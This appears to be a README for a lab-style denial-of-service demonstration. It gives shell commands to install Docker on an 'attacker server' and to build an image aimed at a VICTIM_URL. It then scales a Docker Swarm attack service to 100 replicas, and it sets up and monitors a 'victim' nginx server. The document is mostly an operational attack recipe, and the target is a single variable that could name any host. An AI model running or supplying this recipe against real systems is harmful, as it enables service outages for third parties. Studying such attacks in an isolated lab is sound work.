# DDOS Docker Swarm attack

## Config attacker server
```
    ./connect-to-attacker
    sudo apt update
    sudo apt install apt-transport-https ca-certificates curl software-properties-common
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
    sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable"
    sudo apt update
    sudo apt install docker-ce
```

## Run attack
```
    docker build --build-arg VICTIM_URL=$VICTIM_URL -t ddos-attack:0.1 .
    docker swarm init
    docker service create --name ddos_attack_service --detach=false ddos-attack:0.1
    docker service scale ddos_attack_service=100
```

## Config victim nginx server
```
    ./connect-to-victim
    sudo apt-get install nginx
    sudo mv nginx/default.conf /etc/nginx/sites-enabled/default
    sudo service nginx restart
```

## Monitoring victim nginx server
Go to http://18.190.15.1/nginx_status
